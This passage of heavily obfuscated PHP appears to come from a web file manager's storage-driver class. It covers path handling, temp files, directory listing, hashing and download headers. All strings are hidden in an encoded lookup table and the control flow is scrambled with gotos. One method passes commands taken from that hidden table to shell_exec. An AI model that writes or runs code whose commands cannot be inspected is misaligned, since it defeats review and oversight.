$dŞ¹ÍÇ‘±ˆ . $eÑÀÕ¹…[68] . $Eªªİ”ÙàÕ; if (isset($f¡‘…¬âŒ¿[$EœÄç¬¦ßØ])) { return $f¡‘…¬âŒ¿[$EœÄç¬¦ßØ]; } if (function_exists($eÑÀÕ¹…[69])) { $e¨·ƒÏğˆ = @mb_convert_encoding($Eªªİ”ÙàÕ, $dŞ¹ÍÇ‘±ˆ, $Cğ‡ê¾å‚­); } else { $e¨·ƒÏğˆ = @iconv($Cğ‡ê¾å‚­, $dŞ¹ÍÇ‘±ˆ, $Eªªİ”ÙàÕ); } goto fÚ–ÒÁ¥µâ; fÚ–ÒÁ¥µâ: $e¨·ƒÏğˆ = $e¨·ƒÏğˆ ? $e¨·ƒÏğˆ : $Eªªİ”ÙàÕ; if (strstr($e¨·ƒÏğˆ, $eÑÀÕ¹…[70])) { $e¨·ƒÏğˆ = str_replace($eÑÀÕ¹…[70], $eÑÀÕ¹…[71], $e¨·ƒÏğˆ); } $f¡‘…¬âŒ¿[$Cğ‡ê¾å‚­ . $eÑÀÕ¹…[67] . $dŞ¹ÍÇ‘±ˆ . $eÑÀÕ¹…[68] . $Eªªİ”ÙàÕ] = $e¨·ƒÏğˆ; goto eŒªŒÜ¡ Ş; AİÔ‡¥Õì·: return $e¨·ƒÏğˆ; goto FÖöÛéæçø; eŒªŒÜ¡ Ş: $f¡‘…¬âŒ¿[$dŞ¹ÍÇ‘±ˆ . $eÑÀÕ¹…[67] . $Cğ‡ê¾å‚­ . $eÑÀÕ¹…[68] . $Eªªİ”ÙàÕ] = $Eªªİ”ÙàÕ; $f¡‘…¬âŒ¿[$dŞ¹ÍÇ‘±ˆ . $eÑÀÕ¹…[67] . $Cğ‡ê¾å‚­ . $eÑÀÕ¹…[68] . $e¨·ƒÏğˆ] = $Eªªİ”ÙàÕ; $f¡‘…¬âŒ¿[$Cğ‡ê¾å‚­ . $eÑÀÕ¹…[67] . $dŞ¹ÍÇ‘±ˆ . $eÑÀÕ¹…[68] . $e¨·ƒÏğˆ] = $e¨·ƒÏğˆ; goto AİÔ‡¥Õì·; FÖöÛéæçø: } public function getPathInner($a’Ğªæì“) { $d‰ìæÔŒÚƒ = IO::init($a’Ğªæì“); return $d‰ìæÔŒÚƒ->path; } public function getPathOuter($EÜª••º°Ÿ) { $Fºœ¥îç±È =& $_SERVER[ä°„ä°º]; $Eø…óÚ˜¹ç = strlen(trim($this->pathBase, $Fºœ¥îç±È[8])); $EÜª••º°Ÿ = substr(trim($EÜª••º°Ÿ, $Fºœ¥îç±È[8]), $Eø…óÚ˜¹ç); return $this->pathDriver . $Fºœ¥îç±È[8] . ltrim($EÜª••º°Ÿ, $Fºœ¥îç±È[8]); } public function isParentOf($D£°”„Å‚Í, $A«™ò“«‹ë) { $F¸èù†¯´‡ =& $_SERVER[ä°„ä°º]; $D£°”„Å‚Í = rtrim(strtolower($D£°”„Å‚Í), $F¸èù†¯´‡[8]) . $F¸èù†¯´‡[8]; $A«™ò“«‹ë = rtrim(strtolower($A«™ò“«‹ë), $F¸èù†¯´‡[8]) . $F¸èù†¯´‡[8]; $e£Õ³·¼„Ñ = strpos($A«™ò“«‹ë, $D£°”„Å‚Í) === 0; return $e£Õ³·¼„Ñ; } public function getType() { $F­ÛµšÚ° =& $_SERVER[ä°„ä°º]; $dÂ±º£°İ = str_replace($F­ÛµšÚ°[72], $F­ÛµšÚ°[33], get_class($this)); return strtolower($dÂ±º£°İ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($EµàË‹Ğçˆ, $Dç¼¦§Ş¦¿) { $dóÄóÂÏ =& $_SERVER[ä°„ä°º]; $d¼¤°Éê«ç = rtrim($EµàË‹Ğçˆ, $dóÄóÂÏ[8]) . $dóÄóÂÏ[8] . $Dç¼¦§Ş¦¿; $c„ØÈ“à‚ó = $this->exist($d¼¤°Éê«ç); return $c„ØÈ“à‚ó ? $d¼¤°Éê«ç : !1; } public function setModifyTime($A§Ÿó¥Éœ, $c„ºÒ¥­Ñë = '') { } public function renameObject($BöàßÄÙÆ, $dƒ„Ä™›ö‰) { goto EÌÔÑ§ñÁ; EÌÔÑ§ñÁ: $c®òˆÁ° =& $_SERVER[ä°„ä°º]; $F×‚¬ÃØ·… = $dƒ„Ä™›ö‰; Hook::trigger($c®òˆÁ°[73], $this, $BöàßÄÙÆ, $this, $this->pathFather($BöàßÄÙÆ) . $dƒ„Ä™›ö‰); goto Fß„¯Å‰ª˜; Fß„¯Å‰ª˜: $BöàßÄÙÆ = $this->getPathOuter($BöàßÄÙÆ); $dƒ„Ä™›ö‰ = $this->pathFather($BöàßÄÙÆ) . $dƒ„Ä™›ö‰; if (IO::isFile($BöàßÄÙÆ)) { $E—â’œ­í = IO::copy($BöàßÄÙÆ, $this->pathFather($BöàßÄÙÆ), REPEAT_RENAME_FOLDER, $F×‚¬ÃØ·…); if ($E—â’œ­í) { IO::remove($BöàßÄÙÆ); } } else { $E—â’œ­í = IO::mkdir($dƒ„Ä™›ö‰); if (!$E—â’œ­í) { return !1; } $AÃĞ†±ï×ç = IO::listPath($BöàßÄÙÆ, !0); $aì©›‹’‹› = array_merge($AÃĞ†±ï×ç[$c®òˆÁ°[74]], $AÃĞ†±ï×ç[$c®òˆÁ°[75]]); foreach ($aì©›‹’‹› as $aà·ˆ¶­ãŸ) { IO::move($aà·ˆ¶­ãŸ[$c®òˆÁ°[76]], $dƒ„Ä™›ö‰, REPEAT_RENAME_FOLDER); } IO::remove($BöàßÄÙÆ); } goto Cã×‡ØÃ±; Cã×‡ØÃ±: return $E—â’œ­í ? $dƒ„Ä™›ö‰ : !1; goto D¹¥ëâëĞÅ; D¹¥ëâëĞÅ: } public function tempFile($d·¦ÍÏµšø = '', $b£âºŒ£ç = '') { goto cîÖ³„ØÔ—; cîÖ³„ØÔ—: if (!$d·¦ÍÏµšø) { $d·¦ÍÏµšø = rand_string(15); } $aÎë¹¤Ó = TEMP_FILES . rand_string(15) . $_SERVER[ä°„ä°º][8]; @mkdir($aÎë¹¤Ó, 511, !0); goto E†å†Ò›Â¶; E†å†Ò›Â¶: $aêÎä = $aÎë¹¤Ó . $d·¦ÍÏµšø; @touch($aêÎä); if ($b£âºŒ£ç) { file_put_contents($aêÎä, $b£âºŒ£ç); } goto EùÒÚßº“ñ; EùÒÚßº“ñ: return $aêÎä; goto Bµãî¬ÒÜ; Bµãî¬ÒÜ: } public function tempFileRemve($a¼µÁ·ù¢) { @unlink($a¼µÁ·ù¢); @rmdir($this->pathFather($a¼µÁ·ù¢)); } public function mkfile($D§ùì•ã, $DÌøŠ…™ßÊ = '', $A×‹×Öù¢† = REPEAT_RENAME) { } public function mkdir($a÷œÍäÌØ¾, $CåöËòÈµª = REPEAT_SKIP) { } public function delFile($e¹©áÌ–Óğ) { } public function delFolder($d¢–ÔâÂ§¹) { } public function copyFile($Aé¶‹˜¬®, $f°ÙºÛÅŒ†) { } public function moveFile($b£¤‘»Ùé‘, $Dï¬Šªƒ¯) { } public function remove($eäÁ¿¨÷£) { if ($this->isFile($eäÁ¿¨÷£)) { return $this->delFile($eäÁ¿¨÷£); } return $this->delFolder($eäÁ¿¨÷£); } public function rename($c‘µ×¹ëá, $CÒ½‰†—±·) { } public function exist($a˜©·­ŸÅâ) { } public function findByHash($FåâÚ¢âˆë = '', $B³³ÉÊî†Œ = '') { return !1; } public function isFile($bğ®³ÚÛ„) { } public function isFolder($BÒë‡Â‘Í„) { } public function size($CÚÓ×•¼´©) { } public function info($Bí¨ãºç‰Ô) { } public function infoSimple($CìÄ‰„‡à…) { return $this->info($CìÄ‰„‡à…); } public function infoAuth($còîµåÓ ¯) { return $this->info($còîµåÓ ¯); } public function infoFull($C™‰ƒÈÏõ¬) { return $this->info($C™‰ƒÈÏõ¬); } public function infoWithChildren($d±¹ÌÃ—ëá) { $CˆÚ‚äŒÅ¢ =& $_SERVER[ä°„ä°º]; static $a©Ïï¿Û¿ = array(); if (isset($a©Ïï¿Û¿[$d±¹ÌÃ—ëá])) { return $a©Ïï¿Û¿[$d±¹ÌÃ—ëá]; } $DÖçÁİÓœ‚ = $this->info($d±¹ÌÃ—ëá); if ($DÖçÁİÓœ‚ && $DÖçÁİÓœ‚[$CˆÚ‚äŒÅ¢[29]] == $CˆÚ‚äŒÅ¢[77]) { $B’‡Ìº‹‚¨ = array($CˆÚ‚äŒÅ¢[78] => 0, $CˆÚ‚äŒÅ¢[79] => 0, $CˆÚ‚äŒÅ¢[80] => 0); $this->infoChildren($d±¹ÌÃ—ëá, $B’‡Ìº‹‚¨); $DÖçÁİÓœ‚[$CˆÚ‚äŒÅ¢[78]] = $B’‡Ìº‹‚¨[$CˆÚ‚äŒÅ¢[78]]; $DÖçÁİÓœ‚[$CˆÚ‚äŒÅ¢[81]] = array($CˆÚ‚äŒÅ¢[82] => $B’‡Ìº‹‚¨[$CˆÚ‚äŒÅ¢[79]], $CˆÚ‚äŒÅ¢[83] => $B’‡Ìº‹‚¨[$CˆÚ‚äŒÅ¢[80]]); $a©Ïï¿Û¿[$d±¹ÌÃ—ëá] = $DÖçÁİÓœ‚; } return $DÖçÁİÓœ‚; } public function listPath($DÊ²±ƒÉ« , $Dµ¿ø±ƒÛÊ = false) { } public function has($FËã›»Ãê«, $bº³÷÷ğ–Ç = false, $CÜŞ»­î¶¢ = false) { } public function canRead($AÈÛ¯›«§) { } public function canWrite($f ˆ¬Šñ¦“) { } public function getContent($F‰¥Í—¹Í) { } public function setContent($b³—›¢áÒ¤, $bàİ™×«® = '') { } protected function infoChildren($EÔÓòëö”, &$AØ›Œ˜¥¡·) { $E‹Ÿä“‚Ùª =& $_SERVER[ä°„ä°º]; check_abort_echo(); $Eé‰Û÷šò‹ = $this->listPath($EÔÓòëö”, !0); $Eé‰Û÷šò‹ = array_merge($Eé‰Û÷šò‹[$E‹Ÿä“‚Ùª[75]], $Eé‰Û÷šò‹[$E‹Ÿä“‚Ùª[74]]); foreach ($Eé‰Û÷šò‹ as $b¸»’òĞœ£) { if ($b¸»’òĞœ£[$E‹Ÿä“‚Ùª[29]] == $E‹Ÿä“‚Ùª[77]) { $AØ›Œ˜¥¡·[$E‹Ÿä“‚Ùª[80]]++; $dÖĞøÙâÎ = $this->getPathInner($b¸»’òĞœ£[$E‹Ÿä“‚Ùª[76]]); $this->infoChildren($dÖĞøÙâÎ, $AØ›Œ˜¥¡·); } else { $AØ›Œ˜¥¡·[$E‹Ÿä“‚Ùª[79]]++; $AØ›Œ˜¥¡·[$E‹Ÿä“‚Ùª[78]] += $b¸»’òĞœ£[$E‹Ÿä“‚Ùª[78]]; } } } public function fileSubstr($AôÂ¦æ’ã, $Fˆ›ÛÕã°”, $Aá‡æ³ÉÈ¥) { } public function listAll($CŞÇò«Ê²Š) { } public function listAllMake($BŞçÊ­ÜÛ, &$d¿ÑÄµòÌ) { $DœÆïÂğ± =& $_SERVER[ä°„ä°º]; check_abort_echo(); $bÏÍ«Õ‰Œ½ = $this->listPath($BŞçÊ­ÜÛ, !0); if (!$bÏÍ«Õ‰Œ½) { return; } $A·ºì×¨» = array_merge($bÏÍ«Õ‰Œ½[$DœÆïÂğ±[75]], $bÏÍ«Õ‰Œ½[$DœÆïÂğ±[74]]); foreach ($A·ºì×¨» as $bË¦Ğà½’) { goto Eß×ƒ”Ñ; C­œ é£ß£: $this->listAllMake($bË¦Ğà½’[$DœÆïÂğ±[76]], $d¿ÑÄµòÌ); goto E¶‹Â®ó; AœŸÄ˜ò–à: if (isset($bË¦Ğà½’[$DœÆïÂğ±[84]])) { $BğšŒ‡ïË’[$DœÆïÂğ±[84]] = $bË¦Ğà½’[$DœÆïÂğ±[84]]; } if (!$cÀŠ‰¹“ï‡) { $d¿ÑÄµòÌ[] = $BğšŒ‡ïË’; continue; } $d¿ÑÄµòÌ[] = $BğšŒ‡ïË’; goto C­œ é£ß£; Eß×ƒ”Ñ: $cÀŠ‰¹“ï‡ = $bË¦Ğà½’[$DœÆïÂğ±[29]] == $DœÆïÂğ±[77]; $BğšŒ‡ïË’ = array($DœÆïÂğ±[76] => $bË¦Ğà½’[$DœÆïÂğ±[76]], $DœÆïÂğ±[77] => $cÀŠ‰¹“ï‡); if (isset($bË¦Ğà½’[$DœÆïÂğ±[78]])) { $BğšŒ‡ïË’[$DœÆïÂğ±[78]] = $bË¦Ğà½’[$DœÆïÂğ±[78]]; } goto AœŸÄ˜ò–à; E¶‹Â®ó: } } public function listAllSimple($Eİö·Øç½) { $e—Ï‰šƒƒá =& $_SERVER[ä°„ä°º]; $CÏ²ãõ·« = array(); $AÉø…­Å’ = $this->listAll($Eİö·Øç½); $eêÊø©‡Å = $this->getPathOuter($Eİö·Øç½); foreach ($AÉø…­Å’ as $dˆ¾®ñ–ŸÚ) { goto dø’ÚóŒ¡; E°Œêæ‚Ûø: if (!$dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[77]]) { $Eì»àÌø¶[$e—Ï‰šƒƒá[86]] = $F–¤ÍÄŒ; } $CÏ²ãõ·«[] = $Eì»àÌø¶; goto a‹İ·è×ÄÄ; dø’ÚóŒ¡: $F–¤ÍÄŒ = $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[76]]; $A£‚‡‰† = $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[76]]; if (isset($dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[85]])) { $F–¤ÍÄŒ = $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[85]][$e—Ï‰šƒƒá[76]]; $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[78]] = $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[85]][$e—Ï‰šƒƒá[78]]; $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[84]] = $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[85]][$e—Ï‰šƒƒá[84]]; } else { $A£‚‡‰† = substr($dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[76]], strlen(get_path_father($eêÊø©‡Å))); $A£‚‡‰† = $e—Ï‰šƒƒá[8] . ltrim($A£‚‡‰†, $e—Ï‰šƒƒá[8]); } goto A©”¯çË¶; A©”¯çË¶: $Eì»àÌø¶ = array($e—Ï‰šƒƒá[76] => $A£‚‡‰†, $e—Ï‰šƒƒá[77] => $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[77]]); if (isset($dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[78]]) && !$dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[77]]) { $Eì»àÌø¶[$e—Ï‰šƒƒá[78]] = $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[78]]; } if (isset($dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[84]])) { $Eì»àÌø¶[$e—Ï‰šƒƒá[84]] = $dˆ¾®ñ–ŸÚ[$e—Ï‰šƒƒá[84]]; } goto E°Œêæ‚Ûø; a‹İ·è×ÄÄ: } return $CÏ²ãõ·«; } public function upload($CÏä›æ§, $AØàÑÚÃğ…, $EÅ·Ø¬ÚÈ = false, $aŠÕ„Ï§¥Æ = REPEAT_REPLACE) { } public function uploadFileByID($FˆŒï„„µ±, $E İ§â‘¤, $Fë¢ŒïÇºâ) { } public function uploadFileByPath($C“—Ìà‰¹Ñ, $e…¾—Œ–à‰, $aˆœ»ˆì´ = array()) { } public function isUploadServer() { $b»î½‰Ÿö´ =& $_SERVER[ä°„ä°º]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $b»î½‰Ÿö´[87]) { return !0; } return $GLOBALS[$b»î½‰Ÿö´[6]][$b»î½‰Ÿö´[88]][$b»î½‰Ÿö´[89]]; } public function isFileOutServer() { $E¶¥öÒ³ =& $_SERVER[ä°„ä°º]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $E¶¥öÒ³[87]) { return !0; } return $GLOBALS[$E¶¥öÒ³[6]][$E¶¥öÒ³[88]][$E¶¥öÒ³[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($côšÆõÑ‹) { $B…êäÓ×¡  =& $_SERVER[ä°„ä°º]; if (!$this->isCdnHost()) { return $côšÆõÑ‹; } return str_replace(trim(get_url_root($côšÆõÑ‹), $B…êäÓ×¡ [8]), trim($this->cdnHost, $B…êäÓ×¡ [8]), $côšÆõÑ‹); } public function uploadLink($dºñ‡‹ÏØå, $d©¾ä·Íà¿ = 0) { goto dÃ†³ÄÊ¯; AºÃö÷³¡: $A›İŒŞŞ” = $d©¾ä·Íà¿ <= $FÊÒ²ù¬Ö‹ ? $C¿ï¸‰¹è[91] : $C¿ï¸‰¹è[92]; $c…ƒ®Ãä = (!$d©¾ä·Íà¿ ? 1 : ceil($d©¾ä·Íà¿ / pow(1024, 3))) * 3600 * 4; $FÏ¦×Çğõ‘ = $this->{$A›İŒŞŞ”}($dºñ‡‹ÏØå, $c…ƒ®Ãä); goto c©ùøÁ¹ò; c©ùøÁ¹ò: if ($FÏ¦×Çğõ‘) { $FÏ¦×Çğõ‘[$C¿ï¸‰¹è[93]] = $dºñ‡‹ÏØå; $FÏ¦×Çğõ‘[$C¿ï¸‰¹è[94]] = $dšÒ ¹ÂøÑ; } return $FÏ¦×Çğõ‘; goto cÆ•°ºİ’; dÃ†³ÄÊ¯: $C¿ï¸‰¹è =& $_SERVER[ä°„ä°º]; if ($this->isUploadServer()) { return; } $dšÒ ¹ÂøÑ = $this->getType(); goto Aôƒí¥É„¡; Aôƒí¥É„¡: if (!in_array($dšÒ ¹ÂøÑ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $FÊÒ²ù¬Ö‹ = 1024 * 1024 * 10; goto AºÃö÷³¡; cÆ•°ºİ’: } public function uploadFormData($aåä§ä¹, $F‚ÎªæÕ˜Ğ = 3600) { } public function multiUploadFormData($aÌ„Úäª‰, $bÓÕæ¢¿Öø = 3600) { } public function download($F›™‹´ä½Š, $AÈŠ¿ÍÄŒ) { } public function ext($fù‚¢ïŠØÔ) { $dì™¾¸‡ÔÚ =& $_SERVER[ä°„ä°º]; if (strpos($fù‚¢ïŠØÔ, $dì™¾¸‡ÔÚ[8]) === -1) { $E¾ÑáÏÕŠÈ = $fù‚¢ïŠØÔ; } else { $E¾ÑáÏÕŠÈ = $this->pathThis($fù‚¢ïŠØÔ); } $FÊ®’ïä = $dì™¾¸‡ÔÚ[33]; if (strstr($E¾ÑáÏÕŠÈ, $dì™¾¸‡ÔÚ[95])) { $FÊ®’ïä = substr($E¾ÑáÏÕŠÈ, strrpos($E¾ÑáÏÕŠÈ, $dì™¾¸‡ÔÚ[95]) + 1); $FÊ®’ïä = strtolower($FÊ®’ïä); } if (strlen($FÊ®’ïä) > 3 && preg_match($dì™¾¸‡ÔÚ[96], $FÊ®’ïä, $cË²ÈÁÂé·)) { $FÊ®’ïä = $dì™¾¸‡ÔÚ[33]; } return $FÊ®’ïä; } public function pathThis($eˆó¦‹æº) { $D³ÇŞöÚ…– =& $_SERVER[ä°„ä°º]; $eˆó¦‹æº = str_replace($D³ÇŞöÚ…–[97], $D³ÇŞöÚ…–[8], rtrim($eˆó¦‹æº, $D³ÇŞöÚ…–[8])); $DÈ…‡‹š¼ = strrpos($eˆó¦‹æº, $D³ÇŞöÚ…–[8]); if ($DÈ…‡‹š¼ === !1) { return $eˆó¦‹æº; } return substr($eˆó¦‹æº, $DÈ…‡‹š¼ + 1); } public function pathFather($dØùç½à÷Ç) { $cÃ™¦ÔóõÆ =& $_SERVER[ä°„ä°º]; $dØùç½à÷Ç = str_replace($cÃ™¦ÔóõÆ[97], $cÃ™¦ÔóõÆ[8], rtrim($dØùç½à÷Ç, $cÃ™¦ÔóõÆ[8])); $Cìõ§µä‹ª = strrpos($dØùç½à÷Ç, $cÃ™¦ÔóõÆ[8]); if ($Cìõ§µä‹ª === !1) { return $cÃ™¦ÔóõÆ[33]; } return substr($dØùç½à÷Ç, 0, $Cìõ§µä‹ª + 1); } public function hashSimple($D•İ£Ï·µ) { goto cìÏ‰ËŸñ; d»§ØÄ™: $fÃ™ÂñËÖÌ = 200; $aÂíó”‹¸ = 50; if ($FÙğÙ½Ô¢Ü <= $fÃ™ÂñËÖÌ * $aÂíó”‹¸) { return $this->hashMd5($D•İ£Ï·µ) . $FÙğÙ½Ô¢Ü; } goto cìÕ•ÊÙ•; cìÏ‰ËŸñ: $b»ÜĞœ«Æ® =& $_SERVER[ä°„ä°º]; if (!$D•İ£Ï·µ) { return md5($b»ÜĞœ«Æ®[33]); } $FÙğÙ½Ô¢Ü = $this->size($D•İ£Ï·µ); goto d»§ØÄ™; EÑïƒŸíòŠ: $eä“…ƒ¢ .= $this->fileSubstr($D•İ£Ï·µ, $FÙğÙ½Ô¢Ü - $fÃ™ÂñËÖÌ, $fÃ™ÂñËÖÌ); return md5($eä“…ƒ¢) . $FÙğÙ½Ô¢Ü; goto f§ã³÷’èˆ; cìÕ•ÊÙ•: $fÁï„¬ó¾± = intval($FÙğÙ½Ô¢Ü / $aÂíó”‹¸); $eä“…ƒ¢ = $b»ÜĞœ«Æ®[33]; for ($FÊˆˆ»õã = 0; $FÊˆˆ»õã < $aÂíó”‹¸; $FÊˆˆ»õã++) { $eä“…ƒ¢ .= $this->fileSubstr($D•İ£Ï·µ, $fÁï„¬ó¾± * $FÊˆˆ»õã, $fÃ™ÂñËÖÌ); } goto EÑïƒŸíòŠ; f§ã³÷’èˆ: } public static $md5Cache = array(); public function hashMd5($fŠŞ‹´›Ú) { $fŠŞ‹´›Ú = $this->iconvSystem($fŠŞ‹´›Ú); if (isset(self::$md5Cache[$fŠŞ‹´›Ú])) { return self::$md5Cache[$fŠŞ‹´›Ú]; } self::$md5Cache[$fŠŞ‹´›Ú] = $this->hashMd5Shell($fŠŞ‹´›Ú); if (!self::$md5Cache[$fŠŞ‹´›Ú]) { self::$md5Cache[$fŠŞ‹´›Ú] = @md5_file($fŠŞ‹´›Ú); } return self::$md5Cache[$fŠŞ‹´›Ú]; } private function hashMd5Shell($e±Â¸ƒ•Ö–) { goto f‰è÷˜¯Ğ; DøˆŠ÷“°: $cœó–ëøˆµ = Cache::get($fÄã¤ÙíÎÙ[101]); if (!$cœó–ëøˆµ) { $eÚ‡òñÉÂ‹ = BASIC_PATH . $fÄã¤ÙíÎÙ[102]; $f¨‰ƒµÒ¦ = md5_file($eÚ‡òñÉÂ‹); $cœó–ëøˆµ = $fÄã¤ÙíÎÙ[103]; foreach ($dìã¶®¢ôÒ as $e‘§ª´‰İ) { $dª“ò¶¡Ÿ = shell_exec($e‘§ª´‰İ . "\x20\42{$eÚ‡òñÉÂ‹}\42"); if ($dª“ò¶¡Ÿ && substr(trim($dª“ò¶¡Ÿ), 0, 32) == $f¨‰ƒµÒ¦) { $cœó–ëøˆµ = $e‘§ª´‰İ; break; } } Cache::set($fÄã¤ÙíÎÙ[101], $cœó–ëøˆµ, 3600); } if ($cœó–ëøˆµ == $fÄã¤ÙíÎÙ[103]) { return !1; } goto C×†¸ÇàÎ„; C×†¸ÇàÎ„: $dª“ò¶¡Ÿ = shell_exec($cœó–ëøˆµ . "\40\42{$e±Â¸ƒ•Ö–}\42"); $dª“ò¶¡Ÿ = str_replace($fÄã¤ÙíÎÙ[104], $fÄã¤ÙíÎÙ[33], $dª“ò¶¡Ÿ); return substr($dª“ò¶¡Ÿ, 0, 32); goto eÅ£Ğ‰ó¶; f‰è÷˜¯Ğ: $fÄã¤ÙíÎÙ =& $_SERVER[ä°„ä°º]; if (!function_exists($fÄã¤ÙíÎÙ[98])) { return !1; } $dìã¶®¢ôÒ = array($fÄã¤ÙíÎÙ[99], $fÄã¤ÙíÎÙ[100]); goto DøˆŠ÷“°; eÅ£Ğ‰ó¶: } public function link($a£ïÀæùšƒ) { return $a£ïÀæùšƒ; } public function fileOut($b²Äâ˜¹¤”, $a²•”óîÊº = false, $FµŸöö±Ú¥ = false, $Bì†Œ°÷Á‰ = '') { goto F†¾ÁŞØ‚µ; F†¾ÁŞØ‚µ: $dî‚¿¤¡Á =& $_SERVER[ä°„ä°º]; $this->cacheMethod(null, null); if (!$b²Äâ˜¹¤” || !$this->exist($b²Äâ˜¹¤”)) { show_json(LNG($dî‚¿¤¡Á[105]), !1, $FµŸöö±Ú¥); } goto dÇºà¥¥‚ó; DØ•ÓÛÓù…: $D ¿ù«Ğ˜¤ = strtolower($_SERVER[$dî‚¿¤¡Á[142]]); if ($bìÈ¢Åºá– && $D ¿ù«Ğ˜¤ && $C÷¿³È›ª) { if (strstr($D ¿ù«Ğ˜¤, $dî‚¿¤¡Á[143])) { header($dî‚¿¤¡Á[144] . $b²Äâ˜¹¤”); } else { if (strstr($D ¿ù«Ğ˜¤, $dî‚¿¤¡Á[145])) { header($dî‚¿¤¡Á[146] . $b²Äâ˜¹¤”); } else { if (strstr($D ¿ù«Ğ˜¤, $dî‚¿¤¡Á[147])) { header($dî‚¿¤¡Á[148] . $b²Äâ˜¹¤”); } } } if ($bôŠä‰õ¤è) { header($dî‚¿¤¡Á[149] . $bôŠä‰õ¤è); } return; } if (isset($_SERVER[$dî‚¿¤¡Á[150]])) { if (preg_match($dî‚¿¤¡Á[151], $_SERVER[$dî‚¿¤¡Á[150]], $aÌˆ¨‰ÓÌ)) { $e†•¸øí‹ì = intval($aÌˆ¨‰ÓÌ[1]); if (!empty($aÌˆ¨‰ÓÌ[2])) { $A—æ™ƒÃÇŒ = intval($aÌˆ¨‰ÓÌ[2]); } } header($dî‚¿¤¡Á[152]); header("\x43\x6f\x6e\x74\145\x6e\164\55\122\141\x6e\147\145\x3a\x20\x62\171\164\x65\x73\40{$e†•¸øí‹ì}\55{$A—æ™ƒÃÇŒ}\x2f" . $E§‰ëôà¥Ú); } else { header($dî‚¿¤¡Á[153]); } goto dğèõÊÜé; dÇºà¥¥‚ó: $bìÈ¢Åºá– = $this->getType() == $dî‚¿¤¡Á[106]; $C÷¿³È›ª = $GLOBALS[$dî‚¿¤¡Á[6]][$dî‚¿¤¡Á[88]][$dî‚¿¤¡Á[107]][$dî‚¿¤¡Á[108]]; $bôŠä‰õ¤è = (double) $GLOBALS[$dî‚¿¤¡Á[6]][$dî‚¿¤¡Á[88]][$dî‚¿¤¡Á[107]][$dî‚¿¤¡Á[109]] * 1024 * 1024; goto D¸Šóõ; Bù¿»ß‚á: header($dî‚¿¤¡Á[135] . $Dƒ‰¨µ£·§ . $dî‚¿¤¡Á[127]); header($dî‚¿¤¡Á[136] . $d›³ÂÉ×‚¼); header($dî‚¿¤¡Á[137]); goto e°öƒ ¿­ª; C¥‚¨Ü ù: if (isset($_SERVER[$dî‚¿¤¡Á[131]]) && strtotime($_SERVER[$dî‚¿¤¡Á[131]]) == $dºÀƒ®ğÓ—[$dî‚¿¤¡Á[84]]) { header($dî‚¿¤¡Á[132], !0, 304); die; } if (isset($_SERVER[$dî‚¿¤¡Á[133]]) && $_SERVER[$dî‚¿¤¡Á[133]] == $Bì†Œ°÷Á‰) { header($dî‚¿¤¡Á[134] . $Bì†Œ°÷Á‰, !0, 304); die; } header($dî‚¿¤¡Á[134] . $Bì†Œ°÷Á‰); goto Bù¿»ß‚á; EÎÊğ‡ÅÒ»: if ($_SERVER[$dî‚¿¤¡Á[157]] == $dî‚¿¤¡Á[158]) { return; } $C“ÔªîŸ« = 1024 * 100; $açìÍ–•Ã = 0; goto açö¾§÷˜á; dğèõÊÜé: $aì•¡ëƒ‘ = !0; if ($_SERVER[$dî‚¿¤¡Á[154]] == $dî‚¿¤¡Á[155] && $E§‰ëôà¥Ú > 1204 * 1024 * 1024 * 2) { $aì•¡ëƒ‘ = !1; } if ($aì•¡ëƒ‘) { header($dî‚¿¤¡Á[156] . ($A—æ™ƒÃÇŒ - $e†•¸øí‹ì + 1)); } goto EÎÊğ‡ÅÒ»; e°öƒ ¿­ª: header($dî‚¿¤¡Á[138] . $E§‰ëôà¥Ú); header($dî‚¿¤¡Á[139]); if (!$a²•”óîÊº && $e‘ñ¥£“°ê == $dî‚¿¤¡Á[140]) { if ($E§‰ëôà¥Ú > 1024 * 1024 * 5) { die; } $FíµÓç¯Â = $this->getContent($b²Äâ˜¹¤”); $FíµÓç¯Â = Html::clearSVG($FíµÓç¯Â); header($dî‚¿¤¡Á[141] . strlen($FíµÓç¯Â)); echo $FíµÓç¯Â; die; } goto DØ•ÓÛÓù…; bãÙæ¿ù: if (in_array($e‘ñ¥£“°ê, array($dî‚¿¤¡Á[111], $dî‚¿¤¡Á[112], $dî‚¿¤¡Á[113], $dî‚¿¤¡Á[114]))) { $e‘ñ¥£“°ê = $dî‚¿¤¡Á[115]; } if (!$Bì†Œ°÷Á‰) { $Bì†Œ°÷Á‰ = md5($Dƒ‰¨µ£·§ . $this->hashSimple($b²Äâ˜¹¤”)); } $Bì†Œ°÷Á‰ = $dî‚¿¤¡Á[116] . $Bì†Œ°÷Á‰ . $dî‚¿¤¡Á[116]; goto F¿õšéç‚ñ; CÏ±‚Œƒì­: header($dî‚¿¤¡Á[120]); header($dî‚¿¤¡Á[121] . $E¡”¶ İÛ); $cší“¥ãŞá = rawurlencode($d›³ÂÉ×‚¼); goto C…ÓÌ÷à†ê; D¸Šóõ: @ob_end_clean(); set_timeout(); $dºÀƒ®ğÓ— = $this->infoFull($b²Äâ˜¹¤”); goto e‚ÜòØö‰; F¶¥ğŒ°Ğ„: $e†•¸øí‹ì = 0; $A—æ™ƒÃÇŒ = $E§‰ëôà¥Ú - 1; $e‘ñ¥£“°ê = $this->ext($d›³ÂÉ×‚¼); goto bãÙæ¿ù; 